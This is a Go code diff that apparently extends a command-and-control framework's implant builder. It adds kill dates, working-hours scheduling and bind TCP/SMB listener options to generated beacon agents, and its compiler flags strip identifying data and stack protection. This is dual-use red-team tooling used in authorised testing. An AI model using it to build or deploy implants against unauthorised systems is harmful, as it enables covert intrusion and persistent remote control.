@@ -18,17 +18,24 @@ import (
 )
 
 type GenerateConfig struct {
-	Os      string `json:"os"`
-	Arch    string `json:"arch"`
-	Format  string `json:"format"`
-	Sleep   string `json:"sleep"`
-	Jitter  int    `json:"jitter"`
-	SvcName string `json:"svcname"`
+	Os            string `json:"os"`
+	Arch          string `json:"arch"`
+	Format        string `json:"format"`
+	Sleep         string `json:"sleep"`
+	Jitter        int    `json:"jitter"`
+	SvcName       string `json:"svcname"`
+	IsKillDate    bool   `json:"is_killdate"`
+	Killdate      string `json:"kill_date"`
+	Killtime      string `json:"kill_time"`
+	IsWorkingTime bool   `json:"is_workingtime"`
+	StartTime     string `json:"start_time"`
+	EndTime       string `json:"end_time"`
 }
 
 var (
 	ObjectDir_http = "objects_http"
 	ObjectDir_smb  = "objects_smb"
+	ObjectDir_tcp  = "objects_tcp"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlag          = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
@@ -51,13 +58,28 @@ func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM
 		return nil, err
 	}
 
-	encrypt_key, _ := listenerMap["encrypt_key"].(string)
-	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
-	if err != nil {
-		return nil, err
+	kill_date := 0
+	if generateConfig.IsKillDate {
+		dt := generateConfig.Killdate + " " + generateConfig.Killtime
+		t, err := time.Parse("02.01.2006 15:04:05", dt)
+		if err != nil {
+			err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
+			return nil, err
+		}
+		kill_date = int(t.Unix())
 	}
 
-	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+	working_time := 0
+	if generateConfig.IsWorkingTime {
+		t := generateConfig.StartTime + "-" + generateConfig.EndTime
+		working_time, err = parseStringToWorkingTime(t)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	encrypt_key, _ := listenerMap["encrypt_key"].(string)
+	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
 	if err != nil {
 		return nil, err
 	}
@@ -115,10 +137,12 @@ func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM
 		params = append(params, RequestHeaders)
 		params = append(params, ansOffset1)
 		params = append(params, ansOffset2)
+		params = append(params, kill_date)
+		params = append(params, working_time)
 		params = append(params, seconds)
 		params = append(params, generateConfig.Jitter)
 
-	case "smb":
+	case "bind_smb":
 
 		pipename, _ := listenerMap["pipename"].(string)
 		pipename = "\\\\.\\pipe\\" + pipename
@@ -128,10 +152,9 @@ func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM
 		params = append(params, int(agentWatermark))
 		params = append(params, pipename)
 		params = append(params, int(lWatermark))
-		params = append(params, seconds)
-		params = append(params, generateConfig.Jitter)
+		params = append(params, kill_date)
 
-	case "tcp":
+	case "bind_tcp":
 		prepend, _ := listenerMap["prepend"].(string)
 		port, _ := listenerMap["port_bind"].(float64)
 
@@ -141,8 +164,7 @@ func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM
 		params = append(params, prepend)
 		params = append(params, int(port))
 		params = append(params, int(lWatermark))
-		params = append(params, seconds)
-		params = append(params, generateConfig.Jitter)
+		params = append(params, kill_date)
 
 	default:
 		return nil, errors.New("protocol unknown")
@@ -203,9 +225,12 @@ func AgentGenerateBuild(agentConfig string, operatingSystem string, agentProfile
 	if protocol == "http" {
 		ObjectDir = ObjectDir_http
 		ConnectorFile = "ConnectorHTTP"
-	} else if protocol == "smb" {
+	} else if protocol == "bind_smb" {
 		ObjectDir = ObjectDir_smb
 		ConnectorFile = "ConnectorSMB"
+	} else if protocol == "bind_tcp" {
+		ObjectDir = ObjectDir_tcp
+		ConnectorFile = "ConnectorTCP"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
